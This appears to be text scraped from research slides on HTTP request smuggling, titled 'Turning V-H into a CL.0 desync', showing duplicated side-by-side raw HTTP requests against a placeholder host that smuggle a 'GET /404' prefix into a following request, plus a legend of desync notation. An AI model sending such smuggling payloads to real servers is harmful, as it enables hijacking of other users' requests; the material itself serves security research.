text: Turning V-H into a CL.0 desync GET /style.css HTTP/1.1 GET /style.css HTTP/1.1 Host: <food-corp> Host: <food-corp> Foo: bar Foo: bar Content-Length: 23 Content-Length: 23 GET /404 HTTP/1.1 GET /404 HTTP/1.1 Xy X: yGET / HTTP/1.1 Host: <food-corp> ST Host: <food-corp> {front-end}.{back-end} CL (Content-Length) TE (Transfer-Encoding) 0 (Implicit-zero) H2 (HTTP/2's built-in length)
